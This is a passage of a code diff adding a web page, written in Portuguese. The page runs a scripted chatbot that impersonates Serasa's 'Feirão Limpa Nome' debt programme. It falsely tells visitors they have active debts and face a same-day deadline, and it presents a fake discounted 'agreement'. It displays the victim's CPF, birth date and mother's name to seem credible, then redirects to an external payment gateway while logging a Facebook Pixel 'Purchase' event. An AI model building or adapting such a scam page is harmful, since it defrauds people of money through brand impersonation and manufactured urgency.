+            addMessage('left', `Analisando CPF <strong>${userData.CPF}</strong>... ⏳`);
+            await delay(3000);
+            addMessage('left', `Identificamos <strong>4 dívidas ativas</strong> no sistema <strong> (R$1.928 a R$9.878) <strong> .<br><br>Você tem até <strong>HOJE</strong> para regularizar.<br><br><strong style="color:red;">NEGATIVADO 🚫</strong>`);
+            await delay(2000);
+            addMessage('left', `${userData.NOME}, deseja verificar <strong>acordos com desconto</strong> para seu CPF? 💰`);
+            await delay(1500);
+            addButtons([{ text: 'BUSCAR ACORDO', class: 'btn-primary btn-large', large: true, action: etapaBuscarAcordo }]);
+        }
+
+        async function etapaBuscarAcordo() {
+            showTyping();
+            await delay(2000);
+            addMessage('left', `Verificando acordos para CPF ${userData.CPF}... 🔎`);
+            await delay(3000);
+            addMessage('left', '✅ <strong>Acordo encontrado!</strong> Proposta exclusiva disponível!');
+            await delay(1500);
+            addButtons([{ text: 'VER MEU ACORDO', class: 'btn-primary btn-large', large: true, action: etapaVerAcordo }]);
+        }
+
+        async function etapaVerAcordo() {
+            showTyping();
+            await delay(2000);
+            addAudio('audio/2audio.mp3');
+            await delay(1500);
+            addMessage('left', `🎉 Parabéns <strong>${userData.NOME}</strong>! <strong style="color:var(--rosa-serasa);">${CONFIG.desconto}% DE DESCONTO</strong> para você!`);
+            await delay(2000);
+            addCard(`
+                <div class="acordo-card">
+                    <div class="acordo-header">Feirão Limpa Nome - Serasa</div>
+                    <div style="margin-bottom:10px;"><span style="font-size:12px;color:#999;">Acordo:</span><span class="acordo-num">${acordoNum}</span></div>
+                    <div><strong>${userData.NOME}</strong></div>
+                    <div>CPF: ${userData.CPF}</div>
+                    <div style="margin:10px 0;">✅ ${CONFIG.desconto}% desconto<br>✅ Blindagem CPF<br>✅ Score ${CONFIG.score} pontos</div>
+                    <div style="font-size:18px;"><strong style="color:var(--rosa-serasa);">R$ ${CONFIG.valor}</strong></div>
+                </div>
+            `);
+            await delay(2000);
+            addButtons([{ text: 'CONFIRMAR ACORDO', class: 'btn-primary btn-large', large: true, action: etapaConfirmarAcordo }]);
+        }
+
+        async function etapaConfirmarAcordo() {
+            showTyping();
+            await delay(2000);
+            addMessage('left', '✅ Acordo confirmado com sucesso!');
+            await delay(1500);
+            addAudio('audio/3audio.mp3');
+            await delay(2000);
+            addCard(`
+                <div class="card-dados">
+                    <div class="dado-row"><div class="dado-label">Nome:</div><div class="dado-value">${userData.NOME}</div></div>
+                    <div class="dado-row"><div class="dado-label">CPF:</div><div class="dado-value">${userData.CPF}</div></div>
+                    <div class="dado-row"><div class="dado-label">Nascimento:</div><div class="dado-value">${userData.NASC}</div></div>
+                    <div class="dado-row"><div class="dado-label">Mãe:</div><div class="dado-value">${userData.NOME_MAE}</div></div>
+                    <div class="dado-row"><div class="dado-label">Score:</div><div class="dado-value">105 - Baixo</div></div>
+                </div>
+            `);
+            await delay(1500);
+            addCard(`
+                <div class="acordo-card">
+                    <div class="acordo-header">Acordo Confirmado</div>
+                    <div>Código: ${acordoNum}</div>
+                    <div style="margin:10px 0;"><strong>${CONFIG.score} pontos no score</strong></div>
+                    <div><strong style="color:var(--rosa-serasa);">R$ ${CONFIG.valor}</strong></div>
+                </div>
+            `);
+            await delay(2000);
+            addButtons([{ text: 'PAGAMENTO', class: 'btn-primary btn-large', large: true, action: etapaPagamento }]);
+        }
+
+        async function etapaPagamento() {
+            showTyping();
+            await delay(1500);
+            addMessage('left', `Gerando link seguro... 🔒`);
+            await delay(2500);
+            addMessage('left', `✅ Link pronto!<br><br>Acordo: ${acordoNum}<br>Valor: <strong style="color:var(--rosa-serasa);">R$ ${CONFIG.valor}</strong><br>Desconto: ${CONFIG.desconto}%<br>Score: ${CONFIG.score}`);
+            await delay(2000);
+            addButtons([{ text: 'REALIZAR PAGAMENTO', class: 'btn-primary btn-large', large: true, action: () => {
+                addMessage('left', '🔄 Processando...');
+                // Disparar evento de conversão do Facebook Pixel
+                if (typeof fbq !== 'undefined') {
+                    fbq('track', 'Purchase', { value: CONFIG.valor, currency: 'BRL' });
+                }
+                setTimeout(() => {
+                    window.location.href = CONFIG.gateway + window.location.search;
+                }, 1500);
+            }}]);
+        }
+
+        // ===== INICIALIZAÇÃO =====
+        const styleAnim = document.createElement('style');
+        styleAnim.textContent = `
+            @keyframes slideDown {
+                from { opacity: 0; transform: translateX(-50%) translateY(-20px); }
+                to { opacity: 1; transform: translateX(-50%) translateY(0); }
+            }
+            @keyframes slideUp {
+                from { opacity: 1; transform: translateX(-50%) translateY(0); }
+                to { opacity: 0; transform: translateX(-50%) translateY(-20px); }
+            }
+        `;
+        document.head.appendChild(styleAnim);
+
+        window.onload = () => {
+            console.log('Página carregada, iniciando chat...');
+            initNotificacoes();
+            iniciarFunil();
+        };
+    </script>
+</body>
+
+</html>
